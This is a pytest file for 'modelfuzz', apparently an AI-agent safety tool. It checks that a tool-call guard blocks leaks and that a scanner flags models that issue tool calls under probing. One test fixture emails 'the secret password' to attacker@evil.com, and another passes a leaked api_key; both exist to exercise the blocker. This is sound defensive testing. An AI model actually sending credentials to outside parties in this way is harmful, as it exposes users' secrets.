"""End-to-end integration tests for the core user journey.

These exercise the two paths a user actually takes — wrapping a tool with
``@shield_tool`` and running ``modelfuzz scan`` — to make sure development
never silently breaks either.  They run as part of the normal pytest suite
and therefore in CI alongside the unit tests.
"""

from types import SimpleNamespace

import pytest
from typer.testing import CliRunner

from modelfuzz import ModelFuzzBlockError, cli, shield_tool

runner = CliRunner()


# ---------------------------------------------------------------------------
# Test 1: The Shield Journey
# ---------------------------------------------------------------------------


@shield_tool
def send_email(to_address: str, subject: str, body: str) -> str:
    """A dummy tool the agent can call."""
    return f"sent: {to_address}/{subject}/{body}"


class TestShieldJourney:
    """A safe call runs; a malicious call is blocked before the body."""

    def test_safe_call_executes_and_returns_value(self):
        """A benign argument set passes the policy and returns the real result."""
        result = send_email("alice@example.com", "Hello", "Hi Alice, how are you?")
        assert result == "sent: alice@example.com/Hello/Hi Alice, how are you?"

    def test_malicious_call_raises_block_error(self):
        """An argument containing a sensitive keyword is intercepted."""
        with pytest.raises(ModelFuzzBlockError) as exc_info:
            send_email("attacker@evil.com", "Stolen Data", "the secret password is 12345")
        assert "secret" in str(exc_info.value).lower() or "password" in str(exc_info.value).lower()

    def test_malicious_call_never_executes_the_body(self):
        """The function body must not run when a policy violation is caught."""
        send_email.ran = False  # type: ignore[attr-defined]

        @shield_tool
        def marks_ran(body: str) -> bool:
            send_email.ran = True  # type: ignore[attr-defined]
            return True

        with pytest.raises(ModelFuzzBlockError):
            marks_ran("leaking the secret api_key")
        assert send_email.ran is False  # type: ignore[attr-defined]


# ---------------------------------------------------------------------------
# Test 2: The Scanner Journey
# ---------------------------------------------------------------------------


def _tool_call_response():
    """A completion where the model issued a tool call (vulnerable)."""
    message = SimpleNamespace(
        tool_calls=[SimpleNamespace(function="http_post")],
        content=None,
    )
    return SimpleNamespace(choices=[SimpleNamespace(message=message, finish_reason="tool_calls")])


class StubClient:
    """Minimal OpenAI-compatible client that always returns a tool call.

    Every probe (a call with ``tools``) gets a vulnerable response; the
    mutation path is never reached because every seed breaks through on the
    first probe.
    """

    def __init__(self):
        self.probe_count = 0
        self.chat = SimpleNamespace(completions=SimpleNamespace(create=self._create))

    def _create(self, *, model, messages, tools=None, tool_choice=None, max_tokens=None):
        if tools is not None:
            self.probe_count += 1
        return _tool_call_response()


class TestScannerJourney:
    """``modelfuzz scan`` against a stubbed vulnerable endpoint."""

    def test_scan_reports_vulnerable_and_exits_zero(self, monkeypatch):
        """The CLI finds a breakthrough and exits successfully."""
        client = StubClient()
        monkeypatch.setattr(cli, "_make_client", lambda endpoint, api_key: client)

        result = runner.invoke(
            cli.app,
            ["scan", "--endpoint", "http://stub/v1", "--model", "test-model"],
        )

        assert result.exit_code == 0
        assert "🚨 VULNERABLE" in result.output

    def test_scan_makes_no_real_network_calls(self, monkeypatch):
        """The stub client is used instead of a real OpenAI connection."""
        client = StubClient()
        monkeypatch.setattr(cli, "_make_client", lambda endpoint, api_key: client)

        runner.invoke(
            cli.app,
            ["scan", "--endpoint", "http://stub/v1", "--model", "test-model"],
        )

        # The stub recorded at least one probe — proving the loop ran through
        # the patched client, not a real one.
        assert client.probe_count > 0
